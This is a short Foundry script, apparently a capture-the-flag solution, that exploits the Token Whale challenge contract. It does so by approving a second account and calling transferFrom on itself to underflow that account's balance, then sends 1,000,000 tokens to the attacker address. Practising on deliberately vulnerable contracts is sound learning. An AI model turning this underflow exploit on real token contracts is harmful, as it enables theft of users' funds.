pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/math-challenge/TokenWhale.sol";

contract MyScript is Script {

    function run() public {
        
        // provide private keys for both accounts
        address attacker = 0xF5E1cA50Da44bF3CD71856Eb861Bda320AfFd396;
        address support = 0xC369EAA87c60cAad17BDB5A59e4dEDF43A69ED27;
        
        vm.startBroadcast(attacker);
        
        TokenWhaleChallenge twc = new TokenWhaleChallenge(attacker);

        twc.approve(support, type(uint256).max);

        vm.stopBroadcast();

        vm.startBroadcast(support);
        twc.transferFrom(attacker, attacker, 1);
        twc.transfer(attacker, 1000000);

        vm.stopBroadcast();
    }

}